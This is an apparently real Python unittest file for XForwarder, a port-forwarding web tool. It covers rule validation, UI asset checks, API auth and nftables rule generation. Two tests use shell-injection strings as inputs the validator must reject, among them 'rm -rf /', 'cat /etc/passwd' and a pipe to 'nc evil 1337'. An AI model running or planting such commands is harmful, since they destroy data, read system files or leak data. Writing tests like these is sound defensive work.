#!/usr/bin/env python3
"""
Unit tests for XForwarder UI, API Edge Cases, and Multi-Priority Validation.
Covers rule destination cascades, SSL fallback, boundary sanitization, and static asset integrity.
Standard Library unittest only.
"""

import os
import sys
import unittest
import tempfile
import json
import re
import time
import threading
import urllib.request
import urllib.error
from http.server import HTTPServer
from unittest.mock import patch, MagicMock

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from core.web_server import (
    validate_rule,
    is_valid_target,
    XForwarderWebServer,
    load_config,
    get_services_status,
    XForwarderWebHandler,
    ACTIVE_SESSIONS,
    SESSION_LOCK,
    get_installed_version,
    get_update_status,
    restart_services_action,
    _UPDATE_STATE,
    _UPDATE_LOCK,
    save_sessions_to_disk,
    load_sessions_from_disk,
    save_update_state,
    load_update_state,
    get_local_version_info,
    get_full_version_status
)
from core.engine import XForwarderEngine


class TestUIAndAPIEdgeCases(unittest.TestCase):

    def test_validate_rule_arbitrary_priorities(self):
        """Verifies that validate_rule accepts arbitrary cascading priorities (P1..PN)."""
        rule = {
            "port": 9000,
            "protocol": "both",
            "destinations": [
                {"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 9000},
                {"priority": 2, "type": "nftables", "target": "10.0.0.2", "port": 9000},
                {"priority": 3, "type": "nginx", "target": "10.0.0.3", "port": 9000},
                {"priority": 4, "type": "haproxy", "target": "2001:db8::4", "port": 9000}
            ]
        }
        valid, msg = validate_rule(rule)
        self.assertTrue(valid, f"Expected valid rule, got: {msg}")
        self.assertEqual(len(rule["destinations"]), 4)

    def test_validate_rule_empty_destinations_rejected(self):
        """Verifies that a rule without destinations is rejected."""
        rule = {"port": 8080, "protocol": "tcp", "destinations": []}
        valid, msg = validate_rule(rule)
        self.assertFalse(valid)
        self.assertIn("destination", msg.lower())

    def test_validate_rule_port_boundary_conditions(self):
        """Tests port bounds (1 to 65535)."""
        # Port 0
        valid, _ = validate_rule({"port": 0, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Port 65536
        valid, _ = validate_rule({"port": 65536, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Negative port
        valid, _ = validate_rule({"port": -1, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Valid boundary min
        valid, _ = validate_rule({"port": 1, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertTrue(valid)

        # Valid boundary max
        valid, _ = validate_rule({"port": 65535, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertTrue(valid)

    def test_validate_rule_destination_defaults_port_if_missing(self):
        """Verifies destination inherits rule listening port when omitted."""
        rule = {
            "port": 4444,
            "protocol": "udp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "2001:db8::50"}]
        }
        valid, _ = validate_rule(rule)
        self.assertTrue(valid)
        self.assertEqual(rule["destinations"][0]["port"], 4444)

    def test_validate_rule_invalid_characters_rejected(self):
        """Prevents shell command injection characters in destination target."""
        hazards = [
            "1.2.3.4; rm -rf /",
            "1.2.3.4 && cat /etc/passwd",
            "1.2.3.4 | nc evil 1337",
            "1.2.3.4`reboot`",
            "1.2.3.4$(whoami)"
        ]
        for hazard in hazards:
            rule = {"port": 1234, "protocol": "tcp", "destinations": [{"target": hazard}]}
            valid, msg = validate_rule(rule)
            self.assertFalse(valid, f"Should reject hazard: {hazard}")

    def test_ssl_web_server_graceful_fallback(self):
        """Verifies that XForwarderWebServer handles missing SSL certs without crashing."""
        server = XForwarderWebServer(port=18090, bind_host="127.0.0.1")
        # Explicitly set invalid certificate path
        server.ssl_cert = "/tmp/nonexistent_cert_123.crt"
        server.ssl_key = "/tmp/nonexistent_key_123.key"

        # Web server start logic should catch the FileNotFoundError and stay running as HTTP
        self.assertFalse(server.is_ssl)

    def test_static_assets_integrity(self):
        """Verifies that index.html, style.css, and app.js exist and meet architectural standards."""
        web_dir = os.path.join(REPO_ROOT, "web")
        index_path = os.path.join(web_dir, "index.html")
        style_path = os.path.join(web_dir, "style.css")
        app_path = os.path.join(web_dir, "app.js")

        self.assertTrue(os.path.exists(index_path), "index.html must exist")
        self.assertTrue(os.path.exists(style_path), "style.css must exist")
        self.assertTrue(os.path.exists(app_path), "app.js must exist")

        with open(index_path, "r", encoding="utf-8") as f:
            index_content = f.read()

        with open(style_path, "r", encoding="utf-8") as f:
            style_content = f.read()

        with open(app_path, "r", encoding="utf-8") as f:
            app_content = f.read()

        # 1. Check data-theme pre-hydration script in <head>
        self.assertIn('localStorage.getItem("xfwd_theme")', index_content)
        self.assertIn('data-theme', index_content)

        # 2. Check Light & Dark theme definitions in style.css
        self.assertIn('[data-theme="light"]', style_content)
        self.assertIn('[data-theme="dark"]', style_content)

        # 3. Check hidden scrollbar on modal card
        self.assertIn('scrollbar-width: none', style_content)
        self.assertIn('.modal-card::-webkit-scrollbar', style_content)

        # 4. Check select arrow spacing styling
        self.assertIn('select.form-control', style_content)
        self.assertIn('padding-right: 40px', style_content)

        # 5. Verify quick presets was removed from index.html
        self.assertNotIn('presetHaproxyGre', index_content)
        self.assertNotIn('presetNginxTunnel', index_content)

        # 6. Verify critical DOM element IDs exist in index.html
        critical_ids = [
            "rulesContainer",
            "ruleModal",
            "securityModal",
            "confirmModal",
            "statTotalRules",
            "statActiveHaproxy",
            "statActiveNftables",
            "engineStatusBadge",
            "btnOpenAddModal",
            "searchInput",
            "selectSortRules",
            "btnThemeToggle",
            "btnLoginThemeToggle",
            "loginThemeName",
            "loginScreen",
            "logConsole"
        ]
        for cid in critical_ids:
            self.assertIn(f'id="{cid}"', index_content, f"Missing critical DOM ID: {cid}")

        # 7. Verify unified login screen styling and light theme card shadow in style.css
        self.assertIn('.login-top-bar', style_content)
        self.assertIn('.login-logo', style_content)
        self.assertIn('[data-theme="light"] .login-card', style_content)

        # 8. Verify 2-column rules layout and vertical paths stacking
        self.assertIn('grid-template-columns: repeat(2', style_content)
        self.assertIn('.paths-grid', style_content)
        self.assertIn('flex-direction: column', style_content)
        self.assertIn('.rule-test-bar', style_content)
        self.assertIn('.btn-mode-pill', style_content)
        self.assertIn('.btn-path-test', style_content)

        # 9. Verify testing controls and mode switcher in app.js
        with open(os.path.join(REPO_ROOT, "web", "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        self.assertIn('Auto Failover', app_content)
        self.assertIn('Force P', app_content)
        self.assertIn('btn-mode-pill', app_content)
        self.assertIn('btn-path-test', app_content)

        # 10. Verify faded/dimmed styling for down priority paths
        self.assertIn('.path-box.is-down', style_content)
        self.assertIn("'is-down'", app_content)

    def test_services_status_api_and_dom(self):
        """Verifies get_services_status API structure and DOM presence for NFTables, HAProxy, and Nginx."""
        services = get_services_status()
        self.assertIsInstance(services, dict)
        for svc in ("nftables", "haproxy", "nginx"):
            self.assertIn(svc, services)
            item = services[svc]
            self.assertIn("installed", item)
            self.assertIn("active", item)
            self.assertIn("version", item)
            self.assertIn("details", item)
            self.assertIsInstance(item["installed"], bool)
            self.assertIsInstance(item["active"], bool)

        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "index.html"), "r", encoding="utf-8") as f:
            index_content = f.read()
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        with open(os.path.join(web_dir, "style.css"), "r", encoding="utf-8") as f:
            style_content = f.read()

        # Check DOM element IDs
        for expected_id in (
            "servicesStatusBar",
            "svcPillNft", "svcValNft", "svcDotNft",
            "svcPillHaproxy", "svcValHaproxy", "svcDotHaproxy",
            "svcPillNginx", "svcValNginx", "svcDotNginx",
            "servicesWarningBanner",
            "badgeHaproxyStatus", "badgeNftablesStatus", "badgeNginxStatus"
        ):
            self.assertIn(f'id="{expected_id}"', index_content, f"Missing services DOM ID: {expected_id}")

        # Check app.js function and services rendering
        self.assertIn("renderServicesStatus", app_content)
        self.assertIn("svcDotNft", app_content)
        self.assertIn("svcDotHaproxy", app_content)
        self.assertIn("svcDotNginx", app_content)

        # Check style.css classes
        self.assertIn(".services-status-bar", style_content)
        self.assertIn(".services-warning-banner", style_content)
        self.assertIn(".svc-pill-dot", style_content)

    def test_ui_proxy_protocol_and_test_target_dom(self):
        """Verifies UI elements for PROXY Protocol toggle and Test Target button exist."""
        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        with open(os.path.join(web_dir, "style.css"), "r", encoding="utf-8") as f:
            style_content = f.read()

        self.assertIn("dest-proxy-proto", app_content)
        self.assertIn("proxy_protocol", app_content)
        self.assertIn("testModalDestination", app_content)
        self.assertIn("/test-target", app_content)
        self.assertIn("function addLogEntry", app_content)
        self.assertIn("function appendLogEntry", app_content)
        self.assertIn("runLivePacketLossTest", app_content)
        self.assertIn("pendingOverrides", app_content)
        self.assertIn("<span>Forced</span>", app_content)
        self.assertNotIn("<span>Forced (Reset)</span>", app_content)

        self.assertIn(".dest-proxy-proto", style_content)
        self.assertIn(".btn-test-dest", style_content)
        self.assertIn(".test-dest-result", style_content)

    def test_api_test_target_http_endpoint(self):
        """Tests POST /api/test-target endpoint auth, input validation, and successful probing."""
        cfg = load_config()
        secret = str(cfg.get("web", {}).get("secret_path", "")).strip().strip("/")
        secret_prefix = f"/{secret}" if secret else ""

        server = HTTPServer(("127.0.0.1", 0), XForwarderWebHandler)
        port = server.server_port
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()

        token = "test_target_session_token"
        with SESSION_LOCK:
            ACTIVE_SESSIONS[token] = {
                "username": "admin",
                "created_at": time.time(),
                "last_active": time.time(),
                "expires_at": time.time() + 3600
            }

        try:
            # 1. Unauthenticated request under secret prefix must return 401
            req_unauth = urllib.request.Request(
                f"http://127.0.0.1:{port}{secret_prefix}/api/test-target",
                data=json.dumps({"target": "127.0.0.1", "port": 80}).encode("utf-8"),
                headers={"Content-Type": "application/json"}
            )
            try:
                urllib.request.urlopen(req_unauth, timeout=3.0)
                self.fail("Expected 401 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 401)

            # 2. Authenticated request with invalid target syntax must return 400
            req_bad = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/test-target",
                data=json.dumps({"target": "127.0.0.1; rm -rf /", "port": 80}).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            try:
                urllib.request.urlopen(req_bad, timeout=3.0)
                self.fail("Expected 400 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 400)

            # 3. Authenticated valid request returns JSON with ok: true
            req_valid = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/test-target",
                data=json.dumps({"target": "127.0.0.1", "port": port}).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            with urllib.request.urlopen(req_valid, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(body.get("ok"))
                self.assertTrue(body.get("healthy"))
                self.assertIsNotNone(body.get("latency_ms"))
        finally:
            server.shutdown()
            server.server_close()

    def test_frontend_css_no_hover_motion_transforms(self):
        """Verifies that style.css contains zero hover transform animations (pure subtle color transitions)."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        hover_blocks = re.findall(r'([^{}]*?:hover[^{}]*?\{[^}]*?\})', css, re.DOTALL)
        for block in hover_blocks:
            clean_block = " ".join(block.split())
            self.assertNotIn("transform", clean_block, f"Hover block must not contain transform motion: {clean_block}")
            self.assertNotIn("translateY", clean_block, f"Hover block must not jump vertically: {clean_block}")
            self.assertNotIn("scale", clean_block, f"Hover block must not scale: {clean_block}")

    def test_frontend_css_no_hover_borders_and_subtle_transitions(self):
        """Verifies that style.css enforces borderless, subtle hover states across all components."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        hover_matches = re.finditer(r'([^{}]*?:hover[^{}]*?)\{([^}]*?)\}', css)
        for m in hover_matches:
            selector = m.group(1).strip()
            body = " ".join(m.group(2).strip().split())
            if "autofill" in selector:
                continue
            self.assertNotIn("border-color", body, f"Hover selector '{selector}' must not set border-color: {body}")
            self.assertNotIn("border:", body, f"Hover selector '{selector}' must not set border: {body}")

    def test_frontend_js_latency_and_priority_shortening(self):
        """Verifies that app.js suppresses 0ms latency and formats concise reasons and #num priorities."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # formatLatencyBadge must strictly check for <= 0
        self.assertIn("formatLatencyBadge", js)
        self.assertIn("formatConciseReason", js)
        self.assertIn("ms <= 0", js)
        self.assertIn("#${prio}", js)
        self.assertNotIn("PRIMARY ACTIVE · P1", js)

    def test_drag_and_drop_priority_reordering_integrity(self):
        """Verifies that both rules list and modal support priority drag-and-drop reordering with valid handles."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. Rules list drag-and-drop handlers
        self.assertIn("handlePathDragStart", js)
        self.assertIn("handlePathDragOver", js)
        self.assertIn("handlePathDragLeave", js)
        self.assertIn("handlePathDrop", js)
        self.assertIn("handlePathDragEnd", js)

        # 2. Modal drag-and-drop handlers
        self.assertIn("handleModalPrioDragStart", js)
        self.assertIn("handleModalPrioDragOver", js)
        self.assertIn("handleModalPrioDragLeave", js)
        self.assertIn("handleModalPrioDrop", js)
        self.assertIn("handleModalPrioDragEnd", js)

        # 3. Handle must not be marked draggable="false"
        self.assertNotIn('class="drag-handle" title="Drag to reorder priority" draggable="false"', js)
        self.assertIn('class="drag-handle" title="Drag to reorder priority"', js)

        # 4. Drag-handle SVG pointer events none to ensure grab event propagation
        self.assertIn(".drag-handle svg", css)
        self.assertIn("pointer-events: none", css)

        # 5. CSS classes for drag state
        self.assertIn(".path-box.is-dragging", css)
        self.assertIn(".path-box.drag-over", css)
        self.assertIn(".priority-box.is-dragging", css)
        self.assertIn(".priority-box.drag-over", css)

    def test_drag_and_drop_edge_cases_and_reorder_logic(self):
        """Verifies edge case handling for priority reordering: click isolation, rule scoping, and index bounds."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # 1. Verify click-target isolation: prevents drag start on interactive controls (buttons, copy icon, inputs)
        self.assertIn('e.target.closest("button, .btn-copy, .btn-path-test, input, select, a")', js)

        # 2. Verify within-rule drag scoping: drop target highlight only allowed within the same rule
        self.assertIn("draggedPathInfo.ruleId === ruleId && draggedPathInfo.index !== index", js)

        # 3. Verify lower & upper bounds check before array mutation in both list and modal
        self.assertIn("fromIndex < 0 || toIndex < 0 || fromIndex >= dests.length || toIndex >= dests.length", js)
        self.assertIn("fromIndex < 0 || fromIndex >= currentModalDestinations.length || toIndex < 0 || toIndex >= currentModalDestinations.length", js)

        # 4. Verify fallback rule ID resolution for legacy rules lacking explicit 'id'
        self.assertIn("String(r.id || `rule-${r.port}`) === ruleId", js)

        # 5. Verify backend validate_rule accepts reordered destinations with contiguous priorities
        reordered_rule = {
            "id": "rule-4433",
            "port": 4433,
            "protocol": "both",
            "active_priority": 1,
            "force_override": 0,
            "destinations": [
                {"priority": 1, "type": "nftables", "target": "10.88.2.2", "port": 4433, "comment": "Now Primary"},
                {"priority": 2, "type": "haproxy", "target": "2001:cafe::1", "port": 4433, "comment": "Now Backup"}
            ]
        }
        valid, err = validate_rule(reordered_rule)
        self.assertTrue(valid, f"Reordered destination chain should pass validation: {err}")
        self.assertEqual(reordered_rule["destinations"][0]["priority"], 1)
        self.assertEqual(reordered_rule["destinations"][1]["priority"], 2)

    def test_overview_relay_engines_alignment_and_responsive(self):
        """Verifies that formatEngineVersion truncates long distro strings and CSS enforces aligned, responsive info items."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. formatEngineVersion presence
        self.assertIn("function formatEngineVersion", js)

        # 2. info-value right alignment and wrap protection
        self.assertIn(".info-value", css)
        self.assertIn("text-align: right", css)

        # 3. info-item flex gap spacing
        self.assertIn("gap: 12px", css)

        # 4. Mobile responsive layout
        self.assertIn("@media (max-width: 480px)", css)

    def test_full_responsive_system_integrity(self):
        """Verifies multi-tier responsive system: topbar condensation, drawer breakpoint, and balanced grids."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. HTML responsive classes
        self.assertIn('class="ram-full"', html)
        self.assertIn('class="ram-short"', html)
        self.assertIn('Security & Access', html)
        self.assertIn('class="btn-text">Logout<', html)

        # 2. JS responsive metric injection & drawer auto-close
        self.assertIn('<span class="ram-full">', js)
        self.assertIn('<span class="ram-short">', js)
        self.assertIn("closeMobileSidebar();", js)

        # 3. CSS breakpoints & flex constraints
        self.assertIn("@media (min-width: 1560px)", css)
        self.assertIn("@media (max-width: 1350px)", css)
        self.assertIn("@media (max-width: 1280px)", css)
        self.assertIn("@media (max-width: 1024px)", css)
        self.assertIn("@media (max-width: 768px)", css)
        self.assertIn("@media (max-width: 580px)", css)
        self.assertIn("@media (max-width: 480px)", css)
        self.assertIn(".sys-pill", css)
        self.assertIn("white-space: nowrap", css)
        self.assertIn(".ram-full", css)
        self.assertIn(".ram-short", css)
        self.assertIn("grid-template-columns: repeat(4, 1fr)", css)
        self.assertIn("grid-template-columns: repeat(2, 1fr)", css)

        # 4. Metric sanitization edge case protection
        self.assertIn("Number(sys.ram_used_mb)", js)
        self.assertIn("Number(sys.ram_total_mb)", js)
        self.assertIn("Number(sys.ram_percent)", js)
        self.assertIn("Number(sys.cpu_percent)", js)

    def test_packet_loss_calculation_and_probes(self):
        """Verifies that engine.check_destination calculates packet_loss metrics properly."""
        engine = XForwarderEngine()

        # Invalid target must return 100% loss
        res_invalid = engine.check_destination({"target": "", "port": 0})
        self.assertFalse(res_invalid["healthy"])
        self.assertEqual(res_invalid["packet_loss"], 100)

        from unittest.mock import patch, MagicMock
        # Mock unreachable socket and ping
        with patch("socket.socket") as mock_sock, patch("subprocess.call", return_value=1), patch("subprocess.run") as mock_run:
            mock_s = MagicMock()
            mock_s.connect_ex.return_value = 111
            mock_sock.return_value.__enter__.return_value = mock_s
            mock_proc = MagicMock()
            mock_proc.returncode = 1
            mock_proc.stdout = "100% packet loss"
            mock_run.return_value = mock_proc

            # Single probe failure returns 100% loss and healthy=False
            res_single = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp")
            self.assertIn("packet_loss", res_single)
            self.assertEqual(res_single["packet_loss"], 100)
            self.assertFalse(res_single["healthy"])

            # Multi-probe test (count=3) returns sent and received metrics
            res_multi = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp", count=3)
            self.assertIn("packet_loss", res_multi)
            self.assertEqual(res_multi["packets_sent"], 3)
            self.assertEqual(res_multi["packets_received"], 0)
            self.assertEqual(res_multi["packet_loss"], 100)

        # Mock reachable socket
        with patch("socket.socket") as mock_sock:
            mock_s = MagicMock()
            mock_s.connect_ex.return_value = 0
            mock_sock.return_value.__enter__.return_value = mock_s

            res_healthy = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp")
            self.assertTrue(res_healthy["healthy"])
            self.assertEqual(res_healthy["packet_loss"], 0)

            res_healthy_multi = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp", count=4)
            self.assertTrue(res_healthy_multi["healthy"])
            self.assertEqual(res_healthy_multi["packet_loss"], 0)
            self.assertEqual(res_healthy_multi["packets_received"], 4)

    def test_static_asset_cache_control_and_versioning(self):
        """Verifies that static assets have cache-busting headers and query parameters."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        web_server_path = os.path.join(REPO_ROOT, "core", "web_server.py")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(web_server_path, "r", encoding="utf-8") as f:
            web_code = f.read()

        # HTML has query versioning
        self.assertIn("style.css?v=", html)
        self.assertIn("app.js?v=", html)

        # web_server sends Cache-Control: no-cache, no-store
        self.assertIn('self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")', web_code)
        self.assertIn('self.send_header("Pragma", "no-cache")', web_code)

    def test_pre_auth_flicker_prevention(self):
        """Verifies that pre-auth pre-hydration styles, script, and app.js state management eliminate login screen flicker on reload."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # 1. Inline preHydrationStyles in head prevents flash of login screen before any CSS loads
        self.assertIn('id="preHydrationStyles"', html)
        self.assertIn("html.pre-auth #loginScreen", html)
        self.assertIn("html.pre-auth #dashboardScreen", html)

        # 2. Pre-hydration script checks localStorage and adds pre-auth class synchronously
        self.assertIn('localStorage.getItem("xfwd_authenticated") === "1"', html)
        self.assertIn('document.documentElement.classList.add("pre-auth")', html)

        # 3. Dedicated rules in style.css
        self.assertIn("html.pre-auth #loginScreen", css)
        self.assertIn("html.pre-auth #dashboardScreen", css)

        # 4. app.js showDashboard adds pre-auth and persists token
        self.assertIn('document.documentElement.classList.add("pre-auth")', js)
        self.assertIn('localStorage.setItem("xfwd_authenticated", "1")', js)

        # 5. app.js showLogin cleans up pre-auth and clears token
        self.assertIn('document.documentElement.classList.remove("pre-auth")', js)
        self.assertIn('localStorage.removeItem("xfwd_authenticated")', js)

    def test_tcp_udp_protocol_formatting_and_no_both(self):
        """Verifies that BOTH is replaced by TCP + UDP across the frontend."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # HTML select option
        self.assertIn('value="both">TCP + UDP (Recommended)', html)

        # JS formatProtoBadge returns TCP + UDP
        self.assertIn('return "TCP + UDP"', js)

    def test_packet_loss_diagnostic_tool_elements(self):
        """Verifies that packet loss UI tool and functions exist in frontend."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # HTML diagnostic elements
        self.assertIn('id="diagTargetInput"', html)
        self.assertIn('id="btnRunDiagTest"', html)
        self.assertIn('id="diagResultContainer"', html)

        # JS diagnostic handlers
        self.assertIn("runLivePacketLossTest", js)
        self.assertIn("initDiagPacketLossTool", js)
        self.assertIn("btn-path-test", js)

    def test_topology_and_engines_grid_layout(self):
        """Verifies that Server Network & Tunnel Topology and Relay Engines are structured in a 2-column balanced grid."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # HTML has 2-column container
        self.assertIn('class="topology-engines-grid"', html)
        self.assertIn('class="network-card" id="networkCard"', html)
        self.assertIn('class="engines-card" id="servicesStatusBar"', html)
        self.assertIn('class="engine-item" id="svcPillNft"', html)
        self.assertIn('class="engine-item" id="svcPillHaproxy"', html)
        self.assertIn('class="engine-item" id="svcPillNginx"', html)

        # CSS has grid and responsive collapse
        self.assertIn(".topology-engines-grid", css)
        self.assertIn("grid-template-columns: minmax(0, 1.25fr) minmax(0, 0.75fr)", css)
        self.assertIn(".engine-item", css)

    def test_validate_rule_haproxy_requires_ipv6(self):
        """Verifies that validate_rule strictly enforces that HAProxy destinations must be IPv6."""
        # IPv4 targets must be rejected for HAProxy
        ipv4_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "1.2.3.4", "port": 8080}]
        }
        ok_v4, err_v4 = validate_rule(ipv4_rule)
        self.assertFalse(ok_v4)
        self.assertIn("must be a valid IPv6 address", err_v4)

        # Hostnames must be rejected for HAProxy
        host_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "exit.node.com", "port": 8080}]
        }
        ok_host, err_host = validate_rule(host_rule)
        self.assertFalse(ok_host)
        self.assertIn("must be a valid IPv6 address", err_host)

        # Valid IPv6 without brackets
        v6_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 8080}]
        }
        ok_v6, err_v6 = validate_rule(v6_rule)
        self.assertTrue(ok_v6, f"Expected valid IPv6 to pass, got: {err_v6}")

        # Valid IPv6 with brackets
        v6_bracket_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "[2001:db8::1]", "port": 8080}]
        }
        ok_b, err_b = validate_rule(v6_bracket_rule)
        self.assertTrue(ok_b, f"Expected bracketed IPv6 to pass, got: {err_b}")

    def test_nftables_dual_stack_rules_generation(self):
        """Verifies that _apply_nftables generates isolated table ip and table ip6 for dual-stack forwarding."""
        from core.engine import XForwarderEngine
        engine = XForwarderEngine()

        dnat_rules = [
            '        iifname "eth0" tcp dport 8443 dnat to 10.88.1.2:8443',
            '        iifname "eth0" udp dport 8443 dnat to 10.88.1.2:8443',
            '        iifname "eth0" tcp dport 9443 dnat to [2001:db8::2]:9443',
            '        iifname "eth0" udp dport 9443 dnat to [2001:db8::2]:9443'
        ]

        with patch("shutil.which", return_value="nft"), \
             patch("subprocess.run") as mock_run, \
             patch("subprocess.Popen") as mock_popen, \
             patch.object(engine, "_is_ipv6_supported", return_value=True):
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = ("", "")
            mock_proc.returncode = 0
            mock_popen.return_value = mock_proc

            ok, err = engine._apply_nftables(dnat_rules)
            self.assertTrue(ok)
            self.assertIsNone(err)

            sent_input = mock_proc.communicate.call_args_list[0][1]["input"]
            # Verify IPv4 table exists and contains IPv4 rules
            self.assertIn("table ip xfwd_orchestrator", sent_input)
            self.assertIn('dnat to 10.88.1.2:8443', sent_input)

            # Verify IPv6 table exists and contains IPv6 rules
            self.assertIn("table ip6 xfwd_orchestrator", sent_input)
            self.assertIn('dnat to [2001:db8::2]:9443', sent_input)

            # Verify masquerade on tunnel interfaces exists in both
            self.assertIn('oifname "gre*" masquerade', sent_input)
            self.assertIn('oifname "wg*" masquerade', sent_input)
            self.assertIn('oifname "tun*" masquerade', sent_input)

    def test_dark_theme_tokens_and_restrained_highlights(self):
        """Verifies that dark theme uses obsidian palette and restrains highlights strictly to important states."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # 1. Dark theme tokens in :root, [data-theme="dark"] (Nova Admin Theme)
        self.assertIn("--bg-base: #0B0E14;", css)
        self.assertIn("--bg-surface: #12151f;", css)
        self.assertIn("--accent-rose: #FB7185;", css)

        # 2. Stats numbers in index.html should not have hardcoded glare classes
        self.assertNotIn('id="statActiveHaproxy" class="stat-number text-emerald"', html)
        self.assertNotIn('class="stat-number text-emerald" id="statActiveHaproxy"', html)
        self.assertNotIn('id="statActiveNftables" class="stat-number text-amber"', html)
        self.assertNotIn('class="stat-number text-amber" id="statActiveNftables"', html)

        # 3. Path box active indicator uses left accent border, not neon blur halo
        self.assertIn("border-left: 3px solid var(--accent-emerald);", css)
        self.assertNotIn("box-shadow: 0 0 16px -4px rgba(16, 185, 129, 0.25);", css)

        # 4. Latency threshold in app.js reserves amber warning for > 150ms or loss > 0%
        self.assertIn("ms > 150", js)
        self.assertIn("ms > 250", js)
        self.assertNotIn("ms > 70", js)

    def test_latency_badge_classification_edge_cases(self):
        """Tests that latency classification thresholds categorize clean pings and failure conditions correctly."""
        def classify(status, loss, ms):
            is_healthy = (status == "healthy")
            is_degraded = (status == "degraded")
            is_failed = (status in ("failed", "down"))
            if is_failed or (not is_healthy and not is_degraded):
                return "latency-bad"
            if ms is None or ms <= 0:
                return "latency-good"
            if is_degraded or loss > 25 or ms > 250:
                return "latency-bad"
            if loss > 0 or ms > 150:
                return "latency-medium"
            return "latency-good"

        # Healthy international ping (78ms, 0% loss) -> must be good, NOT warning amber
        self.assertEqual(classify("healthy", 0, 78.2), "latency-good")
